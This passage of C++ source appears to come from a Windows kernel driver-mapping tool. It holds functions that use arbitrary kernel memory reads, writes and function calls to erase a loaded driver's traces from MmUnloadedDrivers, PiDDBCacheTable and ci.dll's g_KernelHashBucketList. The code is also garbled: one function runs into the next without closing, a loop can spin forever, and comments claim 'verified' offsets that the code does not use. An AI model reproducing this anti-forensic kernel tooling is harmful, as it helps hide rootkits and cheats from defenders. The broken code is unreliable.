	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool Driver::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(Nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(Nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<Nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const Nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == hDevice)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	//The handle gives us the driver object of the provider without guessing a
	//single address.
	uint64_t device_object = 0;

	if (!ReadMemory(object + g_offsets.FileObject_DeviceObject, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object (offset 0x" << std::hex << g_offsets.FileObject_DeviceObject << std::dec << L")" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_object + g_offsets.DeviceObject_DriverObject, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object (offset 0x" << std::hex << g_offsets.DeviceObject_DriverObject << std::dec << L")" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(driver_object + g_offsets.DriverObject_DriverSection, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section (offset 0x" << std::hex << g_offsets.DriverObject_DriverSection << std::dec << L")" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] Failed to find driver name (offset 0x" << std::hex << g_offsets.LdrEntry_BaseDllName << std::dec << L")" << std::endl);
		return false;
	}

	//Validate the UNICODE_STRING before it is touched: the buffer pointer must
	//be a kernel address, the length must be sane and match MaximumLength.
	if (((uint64_t)us_driver_base_dll_name.Buffer) < 0xFFFF000000000000ULL ||
		us_driver_base_dll_name.Length > 1024 ||
		us_driver_base_dll_name.Length % sizeof(wchar_t) != 0 ||
		us_driver_base_dll_name.MaximumLength < us_driver_base_dll_name.Length) {
		Log(L"[!] Driver name structure does not look valid, refusing to write" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	//Confirm we are blanking the entry of *our* driver, not a random one.
	std::wstring found_name(unloadedName.get());
	if (found_name.empty() || found_name.size() > 64) {
		Log(L"[!] Driver name is implausible, refusing to write" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDrivers Cleaned: " << found_name << std::endl);
	return true;
}bool Driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool Driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExReleaseResourceLite");

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN Driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID Driver::RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}

Nt::PiDDBCacheEntry* Driver::LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
	
	Nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (Nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver

#ifdef PDB_OFFSETS
	auto PiDDBLockOffset = SymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
	if (!PiDDBLockOffset)
	{
		Log(L"[-] Warning PiDDBLock not found" << std::endl);
		return false;
	}

	auto PiDDBCacheTableOffset = SymbolsHandler::GetInstance()->GetOffset(L"PiDDBCacheTable");
	if (!PiDDBCacheTableOffset)
	{
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	PVOID PiDDBLock = (PVOID)(Driver::ntoskrnlAddr + PiDDBLockOffset);
	Nt::PRTL_AVL_TABLE PiDDBCacheTable = (Nt::PRTL_AVL_TABLE)(Driver::ntoskrnlAddr + PiDDBCacheTableOffset);
#else
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D

	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 48 8D 0D ? ? ? ? B2 01 66 FF 88 ? ? ? ? 90 E8 ? ? ? ? 4C 8B ? 24 update for build 26100.1000
			if (PiDDBLockPtr == NULL) {
				Log(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}
			else {
				Log(L"[+] PiDDBLock found with third pattern" << std::endl);
				PiDDBLockPtr += 19;//third pattern offset
			}
		}
		else {
			Log(L"[+] PiDDBLock found with second pattern" << std::endl);
			PiDDBLockPtr += 16; //second pattern offset
		}
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", Driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx"); // 48 8B F9 33 C0 48 8D 0D
		if (PiDDBCacheTablePtr == NULL) {
			Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
			return false;
		}
		else {
			Log(L"[+] PiDDBCacheTable found with second pattern" << std::endl);
			PiDDBCacheTablePtr += 2;//second pattern offset
		}
	}

	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
	Nt::PRTL_AVL_TABLE PiDDBCacheTable = (Nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);
#endif
	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	auto timestamp = Pe::GetNtHeaders((void*)DriverResource::driver)->FileHeader.TimeDateStamp;

	// search our entry in the table
	Nt::PiDDBCacheEntry* pFoundEntry = (Nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	//The layout of this type is not available from the public PDBs, so the
	//DriverName field is located by content instead of by a hardcoded offset,
	//and only that verified offset is used below.
	{
		const std::wstring needle = n;
		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, 0x80, needle);
		if (name_field == 0) {
			Log(L"[!] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
			ExReleaseResourceLite(PiDDBLock);
			return false;
		}

		Log(L"[+] PiDDB entry name field located at +0x" << std::hex << name_field << std::dec << L" (verified by content)" << std::endl);
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListBlink, &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListFlink, &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	ULONG cacheDeleteCount = 0;
	ReadMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);bool Driver::ClearKernelHashBucketList() {
	uint64_t ci = Utils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
#ifdef PDB_OFFSETS
	auto g_KernelHashBucketListOffset = SymbolsHandler::GetInstance()->GetOffset(L"g_KernelHashBucketList");
	if (!g_KernelHashBucketListOffset)
	{
		Log(L"[-] Can't Find g_KernelHashBucketList Offset" << std::endl);
		return false;
	}

	auto g_HashCacheLockOffset = SymbolsHandler::GetInstance()->GetOffset(L"g_HashCacheLock");
	if (!g_HashCacheLockOffset)
	{
		Log(L"[-] Can't Find g_HashCacheLock Offset" << std::endl);
		return false;
	}

	PVOID g_KernelHashBucketList = (PVOID)(ci + g_KernelHashBucketListOffset);
	PVOID g_HashCacheLock = (PVOID)(ci + g_HashCacheLockOffset);
#else
	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig) {
		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}
#endif

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

	Nt::HashBucketEntry* prev = (Nt::HashBucketEntry*)g_KernelHashBucketList;
	Nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	//The HashBucketEntry layout is not in the public PDB either, so the
	//DriverName offset is discovered by content on the first entry that
	//mentions our driver, and only that verified offset is used afterwards.
	uint32_t hash_entry_name_offset = 0;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName, &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName + sizeof(USHORT), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

		size_t find_result = std::wstring(wsName.get()).find(wdname);
		if (find_result != std::wstring::npos) {
			//Verify by content that this entry really belongs to our driver, and
			//use the offset that the verification proves.
			const uint32_t verified_name_offset = FindUnicodeStringFieldByContent((uint64_t)entry, 0x40, wdname);
			if (verified_name_offset == 0) {
				Log(L"[!] g_KernelHashBucketList entry content did not verify, skipping" << std::endl);
				prev = entry;
				continue;
			}
			hash_entry_name_offset = verified_name_offset;

			Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << L" (name field at +0x" << std::hex << hash_entry_name_offset << std::dec << L")" << std::endl);
				Nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool((uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					return false;
				}
				return true;
			}
		}
		prev = entry;
		//read next
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}



